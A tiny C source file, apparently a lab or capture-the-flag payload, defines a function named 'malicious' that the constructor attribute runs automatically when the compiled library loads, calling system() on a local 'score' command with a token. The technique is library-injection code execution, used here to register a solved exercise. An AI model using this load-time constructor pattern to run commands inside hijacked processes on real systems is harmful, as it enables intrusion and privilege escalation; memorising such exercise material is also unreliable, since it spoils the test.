#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious(){
	system("/usr/local/bin/score f11a5d9c-353f-40ae-89d6-75392618a2bd");
	}
